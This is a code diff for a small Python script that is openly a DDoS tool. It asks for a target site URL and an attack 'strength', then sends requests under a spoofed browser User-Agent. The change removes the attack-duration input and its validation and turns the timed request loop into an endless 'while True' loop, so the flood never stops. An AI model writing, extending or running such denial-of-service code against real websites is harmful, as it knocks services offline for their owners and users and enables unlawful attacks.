@@ -16,7 +16,7 @@ from time import sleep
 
 def DDOS(url):
     try: # Just a way to have a loop happen for a certain amount of seconds using the time module
-        while time.time() - start < (amount):
+        while True:
             now = datetime.now()
             current_time = now.strftime("%H:%M:%S")
 
@@ -55,11 +55,6 @@ def main():
     try:
         url = input("Enter Site URL Here: ")
         amount = int(input("Enter DDOS Strength (Number): ")) # Strength is just how many loops you want at the same time
-        duration = int(input("Enter Attack Duration (Seconds): "))
-        if duration < 1:
-            print()
-            print("Invalid Input, Restart Program And Try Again.")
-            exit()
         attack = get(url, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}) # Headers are not really neccesary I believe ... Might as well leave it in to be safe
         code = attack.status_code # The reason I am running this here even though it is in DDOS() is just to check for errors
     except:
